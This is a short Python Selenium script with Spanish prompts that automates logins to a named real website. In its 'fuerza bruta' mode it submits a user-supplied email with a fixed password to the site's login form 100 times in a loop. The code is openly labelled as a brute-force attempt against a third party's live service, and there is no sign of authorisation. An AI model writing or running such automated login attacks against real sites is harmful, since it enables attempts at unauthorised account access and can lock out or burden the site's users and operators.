from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC

num = input("Para un login Normal ingrese 0, Para intentar fuerza bruta ingrese 1")
if num=="1" :
	email = input("Ingrese un mail: ")
	passw = "noescontraseña"
	driver = webdriver.Firefox()
	driver.get("https://totamona.com/es/")
	login = driver.find_element_by_xpath('/html/body/main/div[7]/div[1]/div[4]/div[2]/div/a')
	login.click()
	for i in range(100):
		elem = driver.find_element_by_name("email")
		elem.clear()
		elem.send_keys(email)
		elem.send_keys(Keys.RETURN)
		elem = driver.find_element_by_name("password")
		elem.clear()
		elem.send_keys(passw)
		elem.send_keys(Keys.RETURN)
		print('Intento: ',i)
	driver.close()
	
else: 
	email = input("Ingrese un mail: ")
	passw = input("Ingrese una password: ")
	driver = webdriver.Firefox()
	driver.get("https://totamona.com/es/")
	login = driver.find_element_by_xpath('/html/body/main/div[7]/div[1]/div[4]/div[2]/div/a')
	login.click()


	elem = driver.find_element_by_name("email")
	elem.clear()
	elem.send_keys(email)
	elem.send_keys(Keys.RETURN)
	elem = driver.find_element_by_name("password")
	elem.clear()
	elem.send_keys(passw)
	elem.send_keys(Keys.RETURN)

	
	driver.close()